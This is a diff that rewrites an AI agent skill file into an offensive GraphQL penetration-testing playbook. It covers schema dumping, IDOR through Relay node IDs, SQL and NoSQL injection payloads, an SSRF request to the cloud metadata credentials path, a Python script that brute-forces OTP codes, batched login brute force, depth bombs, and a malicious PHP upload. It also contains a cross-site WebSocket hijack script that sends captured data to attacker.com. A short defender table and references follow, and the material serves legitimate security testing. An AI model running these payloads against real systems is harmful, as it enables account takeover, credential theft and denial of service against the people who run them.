@@ -1,207 +1,567 @@
-# SKILL: GraphQL Vulnerabilities
+---
+name: offensive-graphql
+description: "Offensive methodology for attacking GraphQL APIs during penetration tests and bug bounty engagements. Covers the full attack lifecycle: endpoint discovery, introspection abuse and blind schema reconstruction when introspection is disabled, authentication and authorization bypass through Relay node IDs and nested object traversal, injection via variables and directives, query batching for brute force and OTP bypass, denial of service through depth bombs and alias amplification, WebSocket subscription hijacking, information disclosure through verbose errors and field suggestion oracles, and file upload abuse via the multipart GraphQL specification. Includes tool-specific guidance for InQL, graphql-cop, CrackQL, BatchQL, Altair, GraphQL Voyager, and clairvoyance. Trigger on: GraphQL, graphql, introspection query, batching attack, query depth, GraphQL injection, GraphQL IDOR, field suggestion, GraphQL auth bypass, GraphQL DoS, GraphQL security, graphql-cop, InQL, CrackQL, BatchQL, Relay node, alias amplification, subscription abuse, multipart upload GraphQL, schema enumeration, __schema, __type."
+---
 
-## Metadata
-- **Skill Name**: graphql-security
-- **Folder**: offensive-graphql
-- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/graphql.md
+# Offensive GraphQL
 
-## Description
-GraphQL security testing checklist: introspection abuse, batching attacks, query depth/complexity DoS, field suggestion enumeration, IDOR via GraphQL, injection through arguments, authorization bypass. Use when assessing GraphQL endpoints in web app tests or bug bounty.
+GraphQL consolidates an entire API surface behind a single endpoint, making it a high-value target during web application assessments. Unlike REST, where each route maps to a discrete resource, a GraphQL schema exposes every type, field, mutation, and subscription in one queryable structure. Attackers who obtain or reconstruct that schema gain a complete map of the application's data model before writing a single exploit. This skill walks you through each phase of a GraphQL engagement with concrete queries, tool invocations, and chaining patterns.
 
-## Trigger Phrases
-Use this skill when the conversation involves any of:
-`GraphQL, introspection, batching attack, query depth, GraphQL injection, GraphQL IDOR, field suggestion, GraphQL auth bypass, GraphQL DoS, GraphQL security`
+## Quick Workflow
 
-## Instructions for Claude
-
-When this skill is active:
-1. Load and apply the full methodology below as your operational checklist
-2. Follow steps in order unless the user specifies otherwise
-3. For each technique, consider applicability to the current target/context
-4. Track which checklist items have been completed
-5. Suggest next steps based on findings
+1. Discover the endpoint -- probe common paths, inspect client-side JS bundles, check WebSocket upgrade headers.
+2. Fingerprint the implementation -- use graphw00f to identify the engine and tailor payloads.
+3. Dump or reconstruct the schema -- full introspection query; if blocked, field suggestion probing or clairvoyance.
+4. Map the attack surface -- feed the schema into GraphQL Voyager or InQL.
+5. Test authentication and authorization -- every query and mutation with no token, low-privilege, and cross-user tokens.
+6. Inject through resolvers -- SQL, NoSQL, and OS command payloads through arguments and variables.
+7. Abuse batching -- arrayed operations for brute force, OTP bypass, and rate limit evasion.
+8. Stress depth and complexity -- nested queries, alias fans, and circular fragments.
+9. Probe subscriptions -- WebSocket with expired or missing tokens, subscribe to sensitive streams.
+10. Exfiltrate via errors -- verbose stack traces, type mismatches, field suggestions.
+11. Test file upload -- multipart GraphQL specification for oversized or malicious files.
+12. Chain and escalate -- combine findings into multi-step attack paths with proof-of-concept queries.
 
 ---
 
-## Full Methodology
+## 1 -- Endpoint Discovery and Fingerprinting
 
-# GraphQL Vulnerabilities
+Probe common paths with a minimal query body. A `__typename` response confirms a live GraphQL endpoint.
 
-## Shortcut
+```bash
+curl -s -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__typename}"}' | jq .
+```
 
-1.  Identify GraphQL Endpoint: Look for common paths like `/graphql`, `/graphiql`, `/graphql.php`, `/graphql/console`. Check network requests in browser developer tools.
-2.  Introspection Query: Send an introspection query to fetch the schema. Tools like GraphiQL or Postman can help. `query={__schema{types{name}}}`
-3.  Analyze Schema: Look for sensitive types, fields, mutations, and subscriptions. Pay attention to authorization logic.
-4.  Test Queries/Mutations:
-    - Check for Information Disclosure (e.g., user data, configuration).
-    - Test for Authorization Bypass (IDOR, insufficient permission checks).
-    - Look for Injection (SQLi, NoSQLi, Command Injection) in input fields.
-    - Test for Denial of Service (complex/deeply nested queries, batching abuse).
-    - Explore Mutations for unintended state changes.
-    - Check Subscriptions for data leakage.
-    - Verify persisted/signed queries enforced in production; depth/complexity limits.
-5.  No Introspection? Try common field/type guessing (e.g., `user`, `admin`, `query`, `mutation`). Use tools like `clairvoyance` or `inql`.
+Paths to probe: `/graphql`, `/graphiql`, `/v1/graphql`, `/v2/graphql`, `/api/graphql`, `/graphql/console`, `/playground`, `/explorer`, `/query`. Some servers accept GET requests:
 
-## Mechanisms
+```bash
+curl -s "https://target.com/graphql?query=\{__typename\}"
+```
 
-- Over-Fetching: Clients can request excessive data, potentially leading to DoS or information disclosure if not properly limited.
-- Under-Fetching/N+1 Problem: Primarily a performance issue—poorly designed resolvers make dozens of backend calls (N+1). While not a direct data‑exposure risk, extreme latency can create timing side‑channels an attacker could measure.
-- Insecure Direct Object References (IDOR): Exposing internal IDs allows attackers to potentially access unauthorized data by guessing/enumerating IDs.
-- Insufficient Authorization: Missing or flawed checks on types, fields, mutations, or subscriptions.
-- Input Validation Issues: Failure to sanitize or validate user input can lead to injection attacks (SQLi, NoSQLi, XSS, SSRF) if resolvers interact with backend systems insecurely.
-- Introspection Enabled in Production: Exposes the entire schema, simplifying reconnaissance for attackers.
-- Batching Abuse: Sending multiple queries/mutations in a single request can overwhelm the server (DoS) or bypass rate limiting.
-- Lack of Depth/Complexity Limiting: Allows excessively nested or complex queries, leading to DoS.
-- Directive Flooding: Sending thousands of `@include`/`@skip` directives in a single query can exhaust parser and validation phases, triggering DoS (e.g., CVE‑2024‑47614 in async‑graphql).
-- Incremental Delivery: `@defer`/`@stream` can multiply work and leak partial data; must be guarded by cost and auth checks on deferred subtrees.
-- File Uploads: Implementations using `graphql-upload` or custom multipart handling can inherit classic upload bugs (path traversal, content-type trust, temp file exposure).
-- Federation/Gateway: Cross-subgraph authorization gaps, entity resolver overfetching, and inconsistent role enforcement at the router vs. subgraphs.
-- CSRF Considerations: If cookie‑based auth is used, enforce header + `Origin` validation; prefer Authorization header.
-- WebSocket Security: GraphQL subscriptions over WebSocket often lack proper authorization on long-lived connections; auth tokens in connection params may not be re-validated after expiry.
-- Field Suggestions: Error messages that suggest valid field names when invalid ones are queried can leak schema information even with introspection disabled.
-- Relay Global IDs: Base64-encoded `Type:ID` patterns (e.g., `base64("User:123")`) are commonly used and can be decoded to reveal internal IDs.
-- Apollo/Hasura Leaks: Production Apollo Server instances may leak schema via query extensions; Hasura permissions misconfiguration can expose direct DB access.
-- Header Injection: `x-hasura-*` headers or custom auth headers may be trusted without validation, enabling privilege escalation.
+Fingerprint the implementation to determine default behaviors (introspection state, error format, batching syntax):
 
-## Hunt
+```bash
+python3 graphw00f.py -t https://target.com/graphql
+```
 
-### Preparation
+Run graphql-cop for a one-pass configuration audit -- it reports introspection status, field suggestion leaks, GET-based query acceptance (CSRF risk), and unrestricted batching:
 
-- Identify the GraphQL endpoint(s).
-- Obtain the schema via introspection or guessing.
-- Understand the application context and potential sensitive data/actions.
+```bash
+python3 graphql-cop.py -t https://target.com/graphql
+```
 
-### Techniques
+---
 
-- Schema Analysis: Use tools like `GraphQL Voyager` or manually review the schema for sensitive keywords (`admin`, `password`, `config`, `secret`), authorization directives, and complex relationships.
-- Query Fuzzing: Use tools like `inql` or custom scripts to fuzz queries, mutations, and arguments.
-- Authorization Testing:
-  - Try accessing data/mutations meant for higher-privileged users.
-  - Test IDOR by replacing IDs in queries/mutations.
-  - Check if different roles see different schema subsets (if applicable).
-  - Verify router and subgraphs enforce identical authz decisions.
-- Injection Testing: Inject payloads (SQL, NoSQL, OS command, XSS, SSRF) into string arguments.
-- DoS Testing:
-  - Deeply nested queries (`query { user { friends { friends { ... } } } }`).
-  - Large limits in list arguments (`query { users(limit: 99999) { id } }`).
-  - Query batching abuse.
-  - Field duplication/aliases (`query { u1: user(id:1){id} u2: user(id:1){id} ... }`).
-  - Directive flooding by attaching a very long chain of `@include` or `@skip` directives to safe fields.
-- Incremental delivery pressure: attach many `@defer`/`@stream` segments to expand compute and memory footprint.
-- Business Logic Flaws: Test mutations for race conditions, logical errors, or unintended side effects.
-- Upload testing: multipart spec edge cases (path traversal via `map`, temp file exposure) and file‑type checks.
-- WebSocket Subscription Testing:
-  - Tamper with `connection_init` payload (JWT in `connectionParams`)
-  - Test subscription flooding without rate limiting
-  - Verify auth token expiry is enforced on long-lived WS connections
-  - Test for cross-user subscription leaks via predictable subscription IDs
-- Field Suggestion Probing: Send invalid field names and analyze error messages for schema hints ("Did you mean...?" responses)
-- Relay ID Decoding: Identify base64-encoded global IDs (e.g., `id: "VXNlcjoxMjM="`), decode to extract type and numeric ID, test IDOR
-- Apollo Extensions: Try `?extensions={"persistedQuery":{...}}` or check for `apollo-server-testing` header in responses
-- Hasura Header Injection: Test `x-hasura-role`, `x-hasura-user-id`, `x-hasura-org-id` headers for authorization bypass
+## 2 -- Introspection and Blind Schema Reconstruction
 
-### Advanced Testing
+### Full Introspection Dump
 
-- Reverse engineer client-side code making GraphQL requests.
-- Analyze traffic between microservices if GraphQL is used internally.
-- Test subscription endpoints for authorization issues and data leakage over time.
+When introspection is enabled, pull the entire schema in one request. This is the single most valuable recon step.
 
-## Bypass Techniques
+```graphql
+query FullIntrospection {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      kind name description
+      fields(includeDeprecated: true) {
+        name args { name type { ...T } defaultValue } type { ...T }
+      }
+      inputFields { name type { ...T } defaultValue }
+      interfaces { ...T }
+      enumValues(includeDeprecated: true) { name description }
+      possibleTypes { ...T }
+    }
+    directives { name description locations args { name type { ...T } } }
+  }
+}
+fragment T on __Type {
+  kind name ofType { kind name ofType { kind name ofType { kind name } } }
+}
+```
 
-### Introspection Disabled
+Pipe the result into GraphQL Voyager for visual exploration, or load InQL in Burp Suite -- it parses the schema and generates individual queries for every field and mutation.
 
-Use wordlists (SecLists has GraphQL lists) with tools like `clairvoyance` or `GraphQLmap` to guess types, fields, and arguments. Analyze client-side code for hints.
+### Targeted __type Queries
 
-- Quick probe: `query { __typename }` often succeeds even when full introspection is disabled and confirms a GraphQL endpoint.
+When full introspection is disabled but `__type` lookups still work (a common misconfiguration where the server blocks `__schema` but forgets `__type`):
 
-- Use wordlists (SecLists has GraphQL lists) with tools like `clairvoyance` or `GraphQLmap` to guess types, fields, and arguments. Analyze client-side code for hints.
+```graphql
+query { __type(name: "User") { name fields { name type { name kind } } } }
+```
 
-### Rate Limiting/Complexity Limits
+### Bypassing Disabled Introspection
 
-- Use aliases to request the same field multiple times within limits.
-- Split complex queries into multiple smaller ones.
-- Abuse batching if not properly limited.
+**Field suggestion oracle.** Most engines return "Did you mean..." when you query a non-existent field. Submit plausible names and harvest suggestions:
 
-### Web Application Firewalls (WAFs)
+```graphql
+query { __typename aaa }
+```
 
-- Use GraphQL query variations (aliases, fragments, different whitespace).
-- Encode payloads within strings.
-- Leverage nested input objects if WAF only inspects top-level arguments.
-- Abuse incremental delivery: place sensitive fields under `@defer` to evade naive complexity calculators.
-- Persisted queries reduce WAF reliance; prefer signature enforcement at edge.
+```json
+{
+  "errors": [{
+    "message": "Cannot query field \"aaa\" on type \"Query\". Did you mean \"user\", \"users\", \"admin\"?"
+  }]
+}
+```
 
-## Vulnerabilities
+Automate this with clairvoyance, which iterates a wordlist, collects suggestions, and assembles a reconstructed schema:
 
-### Common Patterns
+```bash
+python3 clairvoyance.py -t https://target.com/graphql -w wordlist.txt -o schema.json
+```
 
-- Publicly exposed GraphiQL interface with introspection enabled.
-- Mutations lacking proper authorization checks.
-- Resolvers directly using user input in database queries or system commands.
-- Fields returning sensitive information not intended for the user's role.
-- Lack of query depth/complexity/limit controls.
+**Apollo Sandbox.** If the target runs Apollo Server v3+, navigate to the endpoint in a browser. Apollo Sandbox performs introspection client-side even when the production toggle is off. Check Apollo Studio explorer if the server is registered there.
 
-### Specific Functions/Areas:
+**Client-side bundles.** Search JS files for query strings, fragment definitions, and type names:
 
-- `user`, `account`, `profile` types/queries (Information Disclosure, IDOR).
-- `admin`, `settings`, `config` types/queries (Privilege Escalation).
-- Mutations involving payments, data modification, or user management.
-- Search functionalities (Injection).
-- File upload mechanisms via mutations.
-- Subscription endpoints.
+```bash
+curl -s https://target.com/static/js/main.js | grep -oP '(query|mutation|fragment)\s+\w+'
+```
 
-## Methodologies
+---
 
-### Tools
+## 3 -- Authentication and Authorization Bypass
 
-- Automated Scanners: `StackHawk`, `Invicti`, **Escape** (free SaaS tier), `Nuclei` (GraphQL templates).
-- Introspection & Interaction: `GraphiQL`, `Postman`, `Altair GraphQL Client`, `Insomnia`.
-- Schema Exploration: `GraphQL Voyager`.
-- Exploitation/Fuzzing: `inql` (Burp Suite Extension), `GraphQLmap`, `clairvoyance`, **CrackQL** (JWT extraction from errors), **BatchQL** (batch query fuzzing), custom Python scripts (`requests` library).
-- Proxy: Burp Suite, OWASP ZAP (to intercept and modify requests).
-- Security Middleware: **GraphQL Armor** – production‑ready depth, alias and complexity limits for Apollo Server, Yoga, Envelop and more.
-- Fingerprinting / Recon: **graphw00f** – identifies the underlying GraphQL implementation (Apollo, Yoga, Hasura, etc.) to tailor attacks.
-- Security Auditing: **graphql-cop** – security auditing and configuration checking.
-- Endpoint Discovery: `Graphinder` and wordlists for path guessing.
-- Linters/Policy: `graphql-schema-linter`, `eslint-plugin-graphql`, and custom auth directives unit tests.
+Authorization bugs are pervasive because developers must implement field-level checks manually in each resolver. A single missing check on a nested field can expose the entire object graph.
 
-### Systematic Process
+### IDOR Through Relay Node IDs
 
-1.  Reconnaissance (Endpoint discovery, Schema retrieval/guessing).
-2.  Schema Analysis (Identify key types, fields, mutations, auth).
-3.  Authorization Testing (Role-based access, IDOR).
-4.  Input Vulnerability Testing (Injection, XSS, SSRF in arguments).
-5.  DoS Testing (Query complexity, batching, limits).
-6.  Business Logic Testing (Mutation side-effects, race conditions).
-7.  Subscription Testing (if applicable).
+Relay exposes a global `node` interface that resolves any object by an opaque base64-encoded ID (`Type:numericID`):
 
-### High-Impact Targets
+```bash
+echo -n "VXNlcjoxMjM=" | base64 -d   # Output: User:123
+```
 
-Mutations changing state (user roles, passwords, settings), queries accessing sensitive user data, administrative endpoints.
+Forge IDs for other users and query through the node interface:
 
-## Chaining and Escalation
+```graphql
+query {
+  node(id: "VXNlcjoxMjQ=") {
+    ... on User { id email role ssn }
+  }
+}
+```
 
-- **IDOR + Mutation**: Discover an IDOR in a query, then use the leaked ID to modify another user's data via a mutation (e.g., change email/password).
-- **Information Disclosure + Injection**: Leak database structure/version via a verbose error, then use that info to craft a targeted SQLi payload.
-- **SSRF + Internal Endpoint**: Use an SSRF vulnerability in a resolver to interact with internal GraphQL endpoints or other services not directly accessible.
-- **Authorization Bypass + Admin Mutation**: Gain access to an administrative mutation (e.g., `updateUserRole`) through flawed authorization, then escalate privileges.
-- **XSS + Token Theft**: Inject XSS payload via a vulnerable field, steal authentication tokens from other users viewing the data.
+Enumerate sequentially:
 
-## Remediation Recommendations
+```bash
+for i in $(seq 1 100); do
+  id=$(echo -n "User:$i" | base64)
+  curl -s -X POST https://target.com/graphql \
+    -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
+    -d "{\"query\":\"{ node(id: \\\"$id\\\") { ... on User { id email role } } }\"}"
+done
+```
 
-- Disable Introspection in Production: Prevent easy schema discovery.
-- Implement Strict Authorization: Apply checks at the schema level (directives) and within resolvers for every field, type, mutation, and subscription based on user roles/permissions. Use context passed to resolvers.
-- Input Validation & Sanitization: Validate all arguments against expected types, formats, and lengths. Sanitize input before using it in downstream systems (databases, commands). Use parameterized queries.
-- Query Cost Analysis: Implement limits on query depth, complexity (e.g., maximum nodes or calculated cost), and amount (limit number of results).
-- Rate Limiting: Limit the number of requests per user/IP, including batched queries.
-- Persisted & Signed Queries: Enforce automatic persisted queries (APQ) with operation signatures to whitelist allowed operations and block unknown or modified queries.
-- Secure Federation Gateways: Keep Apollo Router (or your GraphQL gateway) patched, validate supergraph composition, and enforce authorization at the gateway layer to prevent cross‑subgraph data leaks.
-- Caching & CDN Hardening: If responses are cached, partition caches by the `Authorization` header (or disable caching) to avoid shared‑cache data leakage.
-- Specific Field Exposure: Avoid exposing sensitive fields (`password`, `internal tokens`). Use dedicated Data Transfer Objects (DTOs) if necessary.
-- Error Handling: Return generic error messages; avoid leaking stack traces or internal details.
-- Regular Audits & Testing: Perform regular security reviews and penetration tests specifically targeting the GraphQL API.
-- Use Security Headers: Apply standard web security headers (CSP, HSTS, etc.).
-- Keep Libraries Updated: Ensure GraphQL server libraries and dependencies are patched.
-- Incremental Delivery Controls: enforce cost accounting for `@defer`/`@stream`; ensure deferred subtrees still run full auth/visibility checks.
-- File Upload Hygiene: if using GraphQL upload, re‑encode images, validate content by signature, and store outside web root; apply all controls from `file-upload.md`.
-- Federation RBAC: centralize auth policy in schema directives evaluated at the gateway and in subgraphs; avoid trusting upstream filtering blindly.
+### Nested Object Authorization Gaps
 
+Authorization enforced on the top-level query often does not carry to nested relationships. Access your own Order, then check whether the customer field traverses to another user's data:
+
+```graphql
+query {
+  myOrders {
+    id
+    customer { id email paymentMethods { cardNumber expirationDate } }
+  }
+}
+```
+
+The `myOrders` resolver filters by your ID, but the `customer` resolver on Order may eagerly load the associated user without ownership checks.
+
+### Relay Pagination and Cursor Manipulation
+
+Decode opaque cursors (often base64 of an offset) and manipulate the value. If the cursor decodes to `cursor:999`, set it to `cursor:0` to access records from the beginning:
+
+```graphql
+query {
+  users(first: 10, after: "Y3Vyc29yOjA=") {
+    edges { node { id email } cursor }
+    pageInfo { hasNextPage endCursor }
+  }
+}
+```
+
+### Mutation Authorization
+
+Test every state-changing mutation with no token, low-privilege tokens, and cross-tenant tokens:
+
+```graphql
+mutation { updateUser(id: "OTHER_USER_ID", input: { role: "ADMIN" }) { id role } }
+mutation { deleteAccount(userId: "OTHER_USER_ID") { success } }
+```
+
+---
+
+## 4 -- Injection Through Resolvers
+
+Variables and arguments flow directly into resolver functions. String concatenation in resolvers creates classic injection vectors.
+
+### SQL Injection via Variables
+
+```graphql
+query GetUser($name: String!) { user(name: $name) { id email } }
+```
+
+```json
+{"name": "admin' OR 1=1 --"}
+```
+
+Escalate with UNION-based injection:
+
+```json
+{"name": "' UNION SELECT username, password FROM admin_users --"}
+```
+
+### NoSQL Injection
+
+For MongoDB-backed resolvers:
+
+```json
+{"filter": {"username": {"$ne": ""}, "password": {"$ne": ""}}}
+```
+
+Time-based detection:
+
+```graphql
+query { search(filter: "{\"$where\": \"sleep(5000)\"}") { results } }
+```
+
+### Directive Injection and Flooding
+
+Directive flooding -- attaching thousands of `@include(if: true)` directives to a single field -- crashes parsers (CVE-2024-47614 in async-graphql):
+
+```graphql
+query { __typename @include(if: true) @include(if: true) @include(if: true) ... }
+```
+
+Generate a payload with 10,000 directives programmatically. Custom `@auth` or `@constraint` directives may also accept arguments you can manipulate to override server-side behavior.
+
+### SSRF Through Resolver Arguments
+
+If a mutation accepts a URL argument (webhooks, avatars, imports), test for SSRF:
+
+```graphql
+mutation { setAvatar(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") { success } }
+```
+
+---
+
+## 5 -- Batching Attacks
+
+GraphQL servers commonly accept arrays of operations in a single HTTP request. Back-end rate limiters often count HTTP requests, not individual operations within a batch, enabling powerful bypass attacks.
+
+### Credential Brute Force
+
+```json
+[
+  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
+  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
+  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"}
+]
+```
+
+A single HTTP request carries hundreds of login attempts. The rate limiter sees one request.
+
+### OTP / 2FA Bypass
+
+Batch all possible 4-digit OTP values in chunks:
+
+```python
+import requests
+
+ops = [{"query": f'mutation {{ verifyOTP(code: "{str(c).zfill(4)}") {{ success token }} }}'}
+       for c in range(10000)]
+for i in range(0, len(ops), 500):
+    r = requests.post("https://target.com/graphql", json=ops[i:i+500],
+                      headers={"Authorization": "Bearer <session_token>"})
+    for idx, res in enumerate(r.json()):
+        if res.get("data", {}).get("verifyOTP", {}).get("success"):
+            print(f"Valid OTP: {str(i + idx).zfill(4)}")
+```
+
+### Alias-Based Batching
+
+Some servers reject array batching but allow alias-based batching within a single query:
+
+```graphql
+query {
+  a1: login(user: "admin", pass: "pass1") { token }
+  a2: login(user: "admin", pass: "pass2") { token }
+  a3: login(user: "admin", pass: "pass3") { token }
+}
+```
+
+Automate with BatchQL and CrackQL:
+
+```bash
+python3 batch-ql.py -e https://target.com/graphql \
+  -q 'mutation { login(user: "admin", pass: "FUZZ") { token } }' -w passwords.txt
+python3 CrackQL.py -t https://target.com/graphql -q query.graphql -i inputs.csv --batch-size 500
+```
+
+---
+
+## 6 -- Denial of Service
+
+GraphQL's flexible query language is inherently susceptible to resource exhaustion unless the server enforces strict cost controls.
+
+### Depth Bomb
+
+Exploit circular relationships. If User has `friends` returning `[User]`, nest indefinitely -- eight levels deep on a user with 100 friends each triggers 100^8 resolver calls:
+
+```graphql
+query DepthBomb {
+  users {
+    friends { friends { friends { friends { friends { friends {
+      id email
+    } } } } } }
+  }
+}
+```
+
+### Alias Amplification
+
+Request the same expensive field thousands of times using aliases. Each alias invokes the resolver independently:
+
+```graphql
+query {
+  a1: expensiveReport(year: 2024) { data }
+  a2: expensiveReport(year: 2024) { data }
+  a3: expensiveReport(year: 2024) { data }
+  # ... repeat 1000 times
+}
+```
+
+### Circular Fragment Spread
+
+Older implementations may not detect circular references, causing infinite recursion:
+
+```graphql
+fragment A on User { friends { ...B } }
+fragment B on User { friends { ...A } }
+query { user(id: 1) { ...A } }
+```
+
+### Incremental Delivery Abuse
+
+If the server supports `@defer` and `@stream`, attach them to expensive subtrees to hold connections open and multiply compute:
+
+```graphql
+query {
+  users(first: 1000) @stream(initialCount: 1) {
+    id
+    orders @defer { total items @stream(initialCount: 1) { name price } }
+  }
+}
+```
+
+---
+
+## 7 -- Subscription Abuse and WebSocket Hijacking
+
+Subscriptions run over WebSocket using `graphql-ws` or the older `subscriptions-transport-ws` protocol. These long-lived connections present a distinct attack surface.
+
+### Unauthenticated Subscription
+
+Connect without authentication in the `connection_init` payload, then subscribe:
+
+```json
+{"type": "connection_init", "payload": {}}
+```
+
+```json
+{"id": "1", "type": "subscribe", "payload": {"query": "subscription { newOrder { id customer { email } total } }"}}
+```
+
+If the server does not validate connection_init, you receive real-time events for all new orders.
+
+### Token Expiry on Long-Lived Connections
+
+WebSocket connections persist after the initial handshake. If the server validates the JWT only during `connection_init`, a token that expires mid-session remains valid for the connection's lifetime. Test by connecting with a short-lived token, waiting for expiry, then sending a new subscription.
+
+### Cross-Site WebSocket Hijacking (CSWSH)
+
+If the WebSocket endpoint relies on cookies and does not validate the Origin header, hijack it from a malicious page:
+
+```html
+<script>
+  var ws = new WebSocket("wss://target.com/graphql", "graphql-ws");
+  ws.onopen = function() {
+    ws.send(JSON.stringify({type:"connection_init",payload:{}}));
+    ws.send(JSON.stringify({id:"1",type:"subscribe",
+      payload:{query:"subscription { sensitiveEvent { data } }"}}));
+  };
+  ws.onmessage = function(e) { fetch("https://attacker.com/c?d="+btoa(e.data)); };
+</script>
+```
+
+---
+
+## 8 -- Information Disclosure and File Upload
+
+### Verbose Error Messages
+
+GraphQL engines often return implementation details in errors. Send type-mismatched arguments to trigger stack traces:
+
+```json
+{
+  "errors": [{
+    "message": "invalid input syntax for type integer: \"abc\"",
+    "extensions": {
+      "exception": {
+        "stacktrace": [
+          "Error: invalid input syntax for type integer: \"abc\"",
+          "    at /app/node_modules/pg/lib/client.js:526:17",
+          "    at /app/src/resolvers/user.js:42:12"
+        ]
+      }
+    }
+  }]
+}
+```
+
+This reveals the database driver (PostgreSQL via `pg`), file paths, and line numbers.
+
+### Field Suggestion as Schema Oracle
+
+Even with introspection disabled, iterate through prefixes to reconstruct the schema via "Did you mean" responses:
+
+```text
+Query field "a" -> "admin", "account"
+Query field "b" -> "billing", "blog"
+Query field "c" -> "customer", "config", "cart"
+```
+
+### Hasura and Apollo-Specific Leaks
+
+**Hasura** -- test `x-hasura-role` and `x-hasura-user-id` header injection when the admin secret is not enforced:
+
+```bash
+curl -s -X POST https://target.com/v1/graphql \
+  -H "Content-Type: application/json" -H "x-hasura-role: admin" -H "x-hasura-user-id: 1" \
+  -d '{"query": "{ users { id email password_hash } }"}'
+```
+
+**Apollo Federation** -- query the `_service` field for the full SDL of a subgraph:
+
+```graphql
+query { _service { sdl } }
+```
+
+### File Upload via Multipart GraphQL
+
+The multipart request specification enables file uploads through mutations. Test for path traversal, unrestricted types, and oversized uploads:
+
+```bash
+curl -s -X POST https://target.com/graphql \
+  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
+  -F map='{"0":["variables.file"]}' \
+  -F 0=@malicious.php
+```
+
+Attack vectors: path traversal via manipulated `map` JSON paths, content-type trust (upload `.php`/`.jsp` and check for magic byte validation), multi-gigabyte uploads for size limit testing, and predictable temp file paths that may be web-accessible before processing.
+
+---
+
+## Detection / Defender View
+
+| Attack Category | Detection / Prevention |
+|---|---|
+| Introspection abuse | Disable in production (`introspection: false`). Monitor for `__schema` and `__type` in query logs. |
+| Field suggestion oracle | Disable suggestions (Apollo: custom plugin to strip; Yoga: `maskedErrors`). |
+| IDOR via node IDs | Enforce ownership checks in every resolver. Use UUIDs over sequential IDs. |
+| Nested auth gaps | Schema-level authorization directives (`@auth`, `@hasRole`). Checks at every resolver, not just top-level. |
+| SQL / NoSQL injection | Parameterized queries exclusively. Never concatenate user input. |
+| Batching brute force | Limit batch size (max 5 operations). Rate-limit by operation count, not HTTP request count. |
+| Alias amplification | Alias count limits. Query cost analysis (graphql-query-complexity, GraphQL Armor). |
+| Depth bomb | Max query depth 7-10 (graphql-depth-limit, GraphQL Armor). |
+| Subscription hijack | Validate auth on every `connection_init`, re-validate tokens periodically, enforce Origin checks. |
+| Verbose errors | Generic error messages in production. Strip stack traces and paths. |
+| File upload abuse | Validate by magic bytes, enforce size limits, store outside web root, re-encode images. |
+| CSRF | Require `Content-Type: application/json`. Reject GET-based mutations. Validate Origin. |
+
+Key hardening tools: **GraphQL Armor** (depth, alias, cost, character limits for Apollo/Yoga/Envelop), **persisted queries** (allowlist known operations, reject ad-hoc queries via APQ with signature enforcement), and WAF rules that parse JSON bodies and inspect the `query` field rather than just URL parameters.
+
+---
+
+## Engagement Cheatsheet
+
+```text
+RECON
+  Endpoint discovery       curl POST /graphql, /v1/graphql, /api/graphql with {__typename}
+  Fingerprint              graphw00f -t <url>
+  Introspection dump       Full __schema query via Altair or InQL
+  Config audit             graphql-cop -t <url>
+  Visualize schema         Introspection JSON into GraphQL Voyager
+
+BLIND SCHEMA RECOVERY
+  Field suggestions        Query invalid fields, collect "Did you mean" responses
+  Automated recovery       clairvoyance -t <url> -w wordlist.txt
+  Client bundles           grep -oP '(query|mutation|fragment)\s+\w+' main.js
+  Apollo sandbox           Navigate to endpoint in browser
+
+AUTH TESTING
+  No-auth access           Replay every query/mutation without Authorization header
+  Horizontal IDOR          Decode Relay node IDs, substitute other user IDs
+  Vertical escalation      Test admin mutations with low-privilege tokens
+  Nested traversal         Follow relationships to reach unauthorized objects
+  Cursor manipulation      Decode Relay cursors, modify offset values
+
+INJECTION
+  SQLi via variables       {"name": "admin' OR 1=1 --"}
+  NoSQL injection          {"filter": {"$ne": ""}}
+  SSRF via URL args        Point URL fields at 169.254.169.254
+  Directive flooding       10,000 @include(if: true) on a single field
+
+BATCHING
+  Array batching           [{"query":"mutation{login(...)}"}, ...]
+  Alias batching           a1: login(...) a2: login(...) ...
+  OTP exhaustion           Batch all 4-6 digit codes in chunks of 500
+  Tools                    CrackQL, BatchQL
+
+DoS
+  Depth bomb               Nest circular relationships 8+ levels
+  Alias amplification      1000+ aliases on an expensive resolver
+  Fragment cycle           Circular fragment spreads (A -> B -> A)
+  Incremental delivery     @defer/@stream on expensive subtrees
+
+SUBSCRIPTIONS
+  No-auth subscribe        connection_init with empty payload
+  Token expiry test        Connect, wait for JWT expiry, send new subscription
+  CSWSH                    Cross-site WebSocket hijack via malicious page
+
+FILE UPLOAD
+  Multipart spec           -F operations=... -F map=... -F 0=@file
+  Path traversal           Manipulate map JSON paths
+  Type bypass              Upload executable with benign Content-Type
+
+INFO DISCLOSURE
+  Verbose errors           Type-mismatched arguments, observe stack traces
+  Federation SDL           { _service { sdl } }
+  Hasura headers           x-hasura-role: admin without admin secret
+```
+
+---
+
+## Key References
+
+- GraphQL specification: https://spec.graphql.org/
+- GraphQL multipart request spec: https://github.com/jaydenseric/graphql-multipart-request-spec
+- InQL (Burp extension): https://github.com/doyensec/inql
+- graphql-cop (security auditor): https://github.com/dolevf/graphql-cop
+- CrackQL (batching/brute force): https://github.com/nicholasaleks/CrackQL
+- BatchQL (batch query tool): https://github.com/assetnote/batchql
+- clairvoyance (schema reconstruction): https://github.com/nikitastupin/clairvoyance
+- graphw00f (fingerprinting): https://github.com/dolevf/graphw00f
+- GraphQL Voyager (visualization): https://graphql-kit.com/graphql-voyager/
+- Altair GraphQL Client: https://altairgraphql.dev/
+- GraphQL Armor (hardening): https://github.com/Escape-Technologies/graphql-armor
+- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
+- HackTricks GraphQL: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
+- Damn Vulnerable GraphQL Application: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
